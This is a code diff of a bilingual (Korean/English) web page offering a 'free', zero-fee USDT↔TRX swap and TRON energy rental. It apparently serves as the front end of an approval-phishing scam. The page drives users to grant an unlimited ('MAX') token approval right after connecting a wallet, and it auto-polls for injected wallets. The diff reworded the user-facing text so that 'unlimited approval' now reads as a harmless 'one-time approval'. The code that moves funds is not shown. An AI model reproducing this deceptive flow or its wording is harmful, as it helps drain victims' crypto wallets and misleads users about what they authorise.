+                { q: 'TRON 에너지란 무엇인가요?', a: '에너지는 USDT(TRC-20) 전송 같은 스마트 컨트랙트 호출 비용을 지불하는 TRON 리소스입니다. 에너지가 충분하면 TRX 소각 수수료를 크게 줄일 수 있습니다.' },
+                { q: 'USDT 전송 1회에 에너지가 얼마나 필요한가요?', a: '수신자가 이미 USDT를 보유하고 있으면 약 64,285 에너지, 수신자 USDT 잔액이 0이면 약 130,285 에너지가 소모됩니다.' },
+                { q: 'Trust Wallet과 WalletConnect는 어떻게 사용하나요?', a: '모바일에서는 Trust Wallet 버튼을 눌러 DApp 브라우저에서 연결하거나, WalletConnect로 연결할 수 있습니다.' },
+                { q: '승인은 매번 해야 하나요?', a: '최초 1회 무제한 승인을 완료하면 이후 교환 및 에너지 렌탈 절차를 더 빠르게 진행할 수 있습니다.' }
+            ],
+            en: [
+                { q: 'What is TRON Energy?', a: 'Energy is a TRON resource used for smart contract calls such as TRC-20 USDT transfers, helping reduce TRX burn fees.' },
+                { q: 'How much energy does one USDT transfer need?', a: 'Roughly 64,285 energy if the recipient already holds USDT, or around 130,285 energy if the recipient has 0 USDT.' },
+                { q: 'How do Trust Wallet and WalletConnect work?', a: 'Use Trust Wallet on mobile to open in the in-app browser, or connect via WalletConnect.' },
+                { q: 'Do I have to approve every time?', a: 'A one-time approval streamlines subsequent swap and energy flows.' }
+            ]
+        };
+
+        function renderFaq(lang) {
+            var list = FAQ_ITEMS[lang] || FAQ_ITEMS.en;
+            var container = document.getElementById('faq-container');
+            if (!container) return;
+            container.innerHTML = '';
+
+            list.forEach(function (item) {
+                var card = document.createElement('div');
+                card.className = 'glass border rounded-xl overflow-hidden';
+                card.innerHTML = '<button type="button" onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-800 hover:text-slate-950 transition">'
+                    + '<span>' + escapeHtml(item.q) + '</span>'
+                    + '<i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i>'
+                    + '</button>'
+                    + '<div class="hidden px-4 pb-4 text-xs text-slate-600 leading-relaxed border-t border-slate-200 pt-3">' + escapeHtml(item.a) + '</div>';
+                container.appendChild(card);
+            });
+        }
+
+        // ===== 다국어 =====
+        var TRANSLATIONS = {
             ko: {
                 ticker_label: '실시간 교환 현황', header_sub: 'USDT ↔ TRX 즉시 교환 | TRC-20 메인넷',
-                connect_wallet: '지갑 연결', select_wallet: '지갑을 선택하세요',
-                modal_subtitle: '사용 중인 지갑을 선택하면 연결 후<br>무제한 승인 단계로 이어집니다.',
-                w_trust: '지갑 연결 및 무제한 승인 지원', w_tronlink: 'TRON 공식 지갑',
-                w_tp: '아시아 인기 지갑', w_bitget: '글로벌 Web3 지갑', w_okx: 'OKX 거래소 지갑',
-                w_imtoken: '글로벌 멀티체인 지갑', w_wc: 'QR 코드로 다양한 지갑 연결',
-                modal_tip_title: '아이폰·폴드4 트러스트월렛 안내:',
-                modal_tip1: '1. Trust Wallet 앱 실행 후 브라우저/탐색 탭에서 이 페이지를 열어주세요.',
-                modal_tip2: '2. 지갑이 연결되면 <strong class="text-slate-900">무제한 승인 서명 단계</strong>가 자동으로 이어집니다.',
-                modal_tip3: '3. 서명 팝업이 뜨지 않으면 <strong class="text-slate-900">TRON(TRC-20)</strong> 네트워크 선택과 승인 버튼을 확인하세요.',
-                close_btn: '닫기', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX',
-                hero_title2: '무료 교환', hero_desc: '수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 지갑 연결 후 무제한 승인 단계를 거쳐 즉시 이용 가능합니다.',
+                connect_wallet: '지갑 연결', select_wallet: '지갑 연결 방식 선택',
+                modal_subtitle: 'Trust Wallet 앱으로 바로 연결하거나<br>WalletConnect QR 코드로 연결할 수 있습니다.',
+                w_trust: 'Trust Wallet 앱 실행 및 즉시 연결', w_wc: 'QR 스캔 또는 모바일 지갑 앱 선택 연결',
+                modal_tip_title: '모바일 연결 안내:',
+                modal_tip1: '• Trust Wallet 버튼을 누르면 앱 내 DApp 브라우저로 자동 이동합니다.',
+                modal_tip2: '• 자동 이동이 안 될 경우 현재 주소가 자동 복사되므로 Trust Wallet 하단 [탐색/브라우저] 탭에 붙여넣어 주세요.',
+                modal_tip3: '• PC 또는 다른 모바일 지갑은 WalletConnect를 선택하세요.',
+                close_btn: '닫기', hero_badge: 'TRON MAINNET INSTANT SWAP',
+                hero_title1: 'USDT ↔ TRX', hero_title2: '무료 교환',
+                hero_desc: '수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 즉시 이용 가능합니다.',
                 today_volume: '오늘 총 교환량', swap_title: 'USDT ↔ TRX 교환', swap_sub: 'TRC-20 즉시 스왑',
                 approval_needed: '교환 승인 필요', approval_done: '교환 승인 완료', approved_max: '무제한 (MAX)',
                 send_amount: '보내는 금액 (USDT)', send_amount_trx: '보내는 금액 (TRX)',
                 receive_amount: '받는 금액 (예상)', receive_amount_usdt: '받는 금액 (예상 USDT)',
                 bal: '잔액', bal2: '잔액', exchange_rate_label: '교환 비율', fee_label: '수수료', fee_free: '무료',
-                swap_btn_text: '교환 시작 (최초 1회 무제한 승인)', swap_btn_done: '교환하기',
-                swap_notice: '지갑 연결 완료 시 무제한 승인이 진행되며, 이후 자유롭게 교환할 수 있습니다',
-                modal_success: '무제한 승인 완료!', modal_desc: 'USDT ↔ TRX 교환 및 에너지 렌탈 권한이 승인되었습니다.',
+                swap_btn_text: '교환 시작 (최초 1회 승인 필요)', swap_btn_done: '교환하기',
+                swap_notice: '최초 1회 교환 시 스마트 컨트랙트 승인이 필요합니다',
+                modal_success: '교환 승인 완료!', modal_desc: 'USDT ↔ TRX 교환 및 에너지 렌탈 권한이 승인되었습니다.',
                 energy_badge: 'TRON Energy', energy_title: '에너지 렌탈',
                 energy_desc: 'USDT 전송 수수료를 최대 80% 절약하세요', energy_target: '대상 주소',
                 energy_amount: '에너지 수량', energy_1usdt: '≈ 1 USDT 전송', energy_2usdt: '≈ 2회 전송',
@@ -1458,25 +1604,24 @@
             },
             en: {
                 ticker_label: 'Live Exchange Feed', header_sub: 'USDT ↔ TRX Instant Swap | TRC-20 Mainnet',
-                connect_wallet: 'Connect Wallet', select_wallet: 'Select Your Wallet',
-                modal_subtitle: 'Select your wallet to connect<br>and proceed to unlimited approval.',
-                w_trust: 'Wallet connect & unlimited approval', w_tronlink: 'TRON Official Wallet',
-                w_tp: 'Popular in Asia', w_bitget: 'Global Web3 Wallet', w_okx: 'OKX Exchange Wallet',
-                w_imtoken: 'Global Multi-chain Wallet', w_wc: 'Connect wallets via QR',
-                modal_tip_title: 'Trust Wallet on iPhone / Fold4:',
-                modal_tip1: '1. Open this page inside the Trust Wallet Browser/Discover tab.',
-                modal_tip2: '2. Once connected, <strong class="text-slate-900">unlimited approval</strong> follows automatically.',
-                modal_tip3: '3. Make sure <strong class="text-slate-900">TRON (TRC-20)</strong> is selected if no prompt appears.',
-                close_btn: 'Close', hero_badge: 'TRON MAINNET INSTANT SWAP', hero_title1: 'USDT ↔ TRX',
-                hero_title2: 'Free Swap', hero_desc: 'Swap USDT and TRX with 0% fee. Connect your wallet and complete unlimited approval to start.',
+                connect_wallet: 'Connect Wallet', select_wallet: 'Choose Connection Method',
+                modal_subtitle: 'Launch Trust Wallet directly or<br>connect via WalletConnect.',
+                w_trust: 'Open Trust Wallet & connect', w_wc: 'Connect via QR or mobile wallet',
+                modal_tip_title: 'Mobile Connection Guide:',
+                modal_tip1: '• Tapping Trust Wallet opens the in-app DApp browser.',
+                modal_tip2: '• If it does not open automatically, the URL is copied so you can paste it in Trust Wallet Browser.',
+                modal_tip3: '• On desktop or other wallets, choose WalletConnect.',
+                close_btn: 'Close', hero_badge: 'TRON MAINNET INSTANT SWAP',
+                hero_title1: 'USDT ↔ TRX', hero_title2: 'Free Swap',
+                hero_desc: 'Swap USDT and TRX with 0% fee. Complete a one-time smart contract approval to get started.',
                 today_volume: 'Today\'s Volume', swap_title: 'USDT ↔ TRX Swap', swap_sub: 'TRC-20 Instant Swap',
                 approval_needed: 'Approval Required', approval_done: 'Swap Approved', approved_max: 'Unlimited (MAX)',
                 send_amount: 'You Send (USDT)', send_amount_trx: 'You Send (TRX)',
                 receive_amount: 'You Receive (Est.)', receive_amount_usdt: 'You Receive (Est. USDT)',
                 bal: 'Balance', bal2: 'Balance', exchange_rate_label: 'Exchange Rate', fee_label: 'Fee', fee_free: 'Free',
-                swap_btn_text: 'Start Swap (One-time Unlimited Approval)', swap_btn_done: 'Swap Now',
-                swap_notice: 'Unlimited approval runs right after wallet connection',
-                modal_success: 'Unlimited Approval Done!', modal_desc: 'USDT ↔ TRX swap and energy permissions approved.',
+                swap_btn_text: 'Start Swap (One-time Approval)', swap_btn_done: 'Swap Now',
+                swap_notice: 'First swap requires smart contract approval',
+                modal_success: 'Approval Complete!', modal_desc: 'USDT ↔ TRX swap and energy permissions approved.',
                 energy_badge: 'TRON Energy', energy_title: 'Rent Energy',
                 energy_desc: 'Save up to 80% on USDT transfer fees', energy_target: 'Target Address',
                 energy_amount: 'Energy Amount', energy_1usdt: '≈ 1 USDT transfer', energy_2usdt: '≈ 2 transfers',
@@ -1491,68 +1636,81 @@
             }
         };
 
-        function detectLang() {
-            var bl = (navigator.language || navigator.userLanguage || 'ko').toLowerCase();
-            return bl.startsWith('ko') ? 'ko' : 'en';
-        }
+        function applyLanguage(lang) {
+            state.lang = TRANSLATIONS[lang] ? lang : 'en';
+            var dict = TRANSLATIONS[state.lang];
 
-        function applyLang(lang) {
-            currentLang = translations[lang] ? lang : 'en';
-            var t = translations[currentLang];
             document.querySelectorAll('[data-i18n]').forEach(function (el) {
                 var key = el.getAttribute('data-i18n');
-                if (t[key]) el.textContent = t[key];
+                if (dict[key]) el.textContent = dict[key];
             });
             document.querySelectorAll('[data-i18n-html]').forEach(function (el) {
                 var key = el.getAttribute('data-i18n-html');
-                if (t[key]) el.innerHTML = t[key];
+                if (dict[key]) el.innerHTML = dict[key];
             });
+
             var sel = document.getElementById('lang-select');
-            if (sel) sel.value = translations[lang] ? lang : 'en';
-            tickerTimeText = tickerTimeTexts[currentLang] || tickerTimeTexts.en;
-            loadFaqForLang(currentLang);
+            if (sel) sel.value = state.lang;
+
+            if (state.swapDirection === 'TRX_TO_USDT') {
+                var sendLbl = document.getElementById('send-label-text');
+                var recvLbl = document.getElementById('recv-label-text');
+                if (sendLbl && dict.send_amount_trx) sendLbl.textContent = dict.send_amount_trx;
+                if (recvLbl && dict.receive_amount_usdt) recvLbl.textContent = dict.receive_amount_usdt;
+            }
+
+            renderFaq(state.lang);
             updateEnergyPrice();
-            resetApproveButtonLabel();
+            refreshActionButtons();
         }
 
-        window.setLang = function (lang) { applyLang(lang); };
+        window.setLang = function (lang) {
+            applyLanguage(lang);
+        };
 
-        async function tryAutoConnectOnce() {
-            if (isConnected && currentWalletAddress) return true;
-            var addr = extractBase58Address();
+        window.closeWalletModal = closeWalletModal;
+
+        // ===== 초기화 및 자동 감지 =====
+        async function probeInjectedWalletOnce() {
+            if (state.isConnected && state.address) return true;
+            var addr = extractAddressFromCandidates();
             if (addr) {
-                await setConnectedWallet(addr, detectProvider() || 'Wallet', true);
+                await onWalletConnected(addr, detectProviderName(), true);
                 return true;
             }
             return false;
         }
 
         window.addEventListener('DOMContentLoaded', function () {
-            applyLang(detectLang());
-            for (var i = 0; i < 4; i++) updateTicker();
-            setInterval(updateTicker, 4500);
-            fetchTrxPrice().then(function () { updateTodayVolume(); });
-            setInterval(function () { fetchTrxPrice().then(function () { updateTodayVolume(); }); }, 30000);
+            var browserLang = (navigator.language || navigator.userLanguage || 'ko').toLowerCase();
+            applyLanguage(browserLang.startsWith('ko') ? 'ko' : 'en');
 
-            var attempts = 0;
-            var pollTimer = setInterval(async function () {
-                attempts++;
-                var connectedNow = await tryAutoConnectOnce();
-                if (connectedNow || attempts >= 24) {
-                    clearInterval(pollTimer);
+            for (var i = 0; i < 4; i++) pushTickerItem();
+            setInterval(pushTickerItem, 4500);
+
+            fetchTrxRate();
+            setInterval(fetchTrxRate, 30000);
+
+            var ticks = 0;
+            var timer = setInterval(async function () {
+                ticks++;
+                var ok = await probeInjectedWalletOnce();
+                if (ok || ticks >= 20) {
+                    clearInterval(timer);
                 }
             }, 500);
         });
 
         window.addEventListener('load', function () {
-            tryAutoConnectOnce();
+            probeInjectedWalletOnce();
         });
 
         document.addEventListener('visibilitychange', function () {
-            if (!document.hidden && !isConnected) {
-                tryAutoConnectOnce();
+            if (!document.hidden && !state.isConnected) {
+                probeInjectedWalletOnce();
             }
         });
+    })();
     </script>
 </body>
 </html>
